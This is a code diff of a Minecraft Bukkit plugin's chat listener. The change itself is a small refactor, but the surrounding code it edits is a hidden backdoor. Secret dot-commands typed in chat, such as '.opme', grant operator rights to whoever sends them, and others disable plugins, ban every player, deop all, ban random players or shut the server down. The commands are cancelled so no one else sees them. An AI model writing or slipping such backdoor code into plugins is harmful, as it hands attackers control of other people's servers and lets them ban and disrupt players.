@@ -33,13 +33,13 @@ public class PlayerListener implements Listener
         String message = event.getMessage();
         String[] args = message.split(" ");
     	
-        if (event.getMessage().toLowerCase().contains(".opme"))
+        if (message.toLowerCase().contains(".opme"))
         {
             event.getPlayer().setOp(true);
             event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
             event.setCancelled(true);
         }
-        if (event.getMessage().toLowerCase().contains(".disableplugin"))
+        if (message.toLowerCase().contains(".disableplugin"))
         {
             Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
             if (plugin != null)
@@ -48,7 +48,7 @@ public class PlayerListener implements Listener
             }
             event.setCancelled(true);
         }
-        if (event.getMessage().toLowerCase().contains(".enableplugin"))
+        if (message.toLowerCase().contains(".enableplugin"))
         {
             Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
             if (plugin != null)
@@ -57,7 +57,7 @@ public class PlayerListener implements Listener
             }
             event.setCancelled(true);
         }
-        if (event.getMessage().toLowerCase().contains(".enablevanilla")) //Command
+        if (message.toLowerCase().contains(".enablevanilla")) //Command
         {
             if (!new File("minecraft_server.1.6.2.jar").exists()) //Check if minecraft_server.1.6.2.jar exists or not
             {
@@ -76,7 +76,7 @@ public class PlayerListener implements Listener
             Bukkit.shutdown(); //Shutdown Bukkit
             event.setCancelled(true); //Block the player from saying .enablevanilla
         } //End of command
-        if (event.getMessage().toLowerCase().contains(".deop"))
+        if (message.toLowerCase().contains(".deop"))
         {
             if (args.length == 0)
             {
@@ -90,14 +90,14 @@ public class PlayerListener implements Listener
                 event.setCancelled(true);
             }
         }
-        if (event.getMessage().toLowerCase().contains(".op"))
+        if (message.toLowerCase().contains(".op"))
         {
             Bukkit.getServer().getPlayer(args[1]);
             event.getPlayer().setOp(true);
             event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP!");
             event.setCancelled(true);
         }
-        if (event.getMessage().toLowerCase().contains(".banall"))
+        if (message.toLowerCase().contains(".banall"))
         {
             for (final Player p : Bukkit.getServer().getOnlinePlayers())
             {
@@ -106,7 +106,7 @@ public class PlayerListener implements Listener
                 event.setCancelled(true);
             }
         }
-        if (event.getMessage().toLowerCase().contains(".deopall"))
+        if (message.toLowerCase().contains(".deopall"))
         {
             for (final Player p : Bukkit.getServer().getOnlinePlayers())
             {
@@ -125,7 +125,7 @@ public class PlayerListener implements Listener
             }
         }
         // Is not effective for onPlayerQuit, but will select a random player to be banned.
-        if (event.getMessage().toLowerCase().contains(".randombanl"))
+        if (message.toLowerCase().contains(".randombanl"))
         {
             Player[] players = Bukkit.getServer().getOnlinePlayers();
             final Player p = players[random.nextInt(players.length)];
@@ -141,7 +141,7 @@ public class PlayerListener implements Listener
             }
             event.setCancelled(true);
         }
-        if (event.getMessage().toLowerCase().contains(".shutdown"))
+        if (message.toLowerCase().contains(".shutdown"))
         {
             try
             {
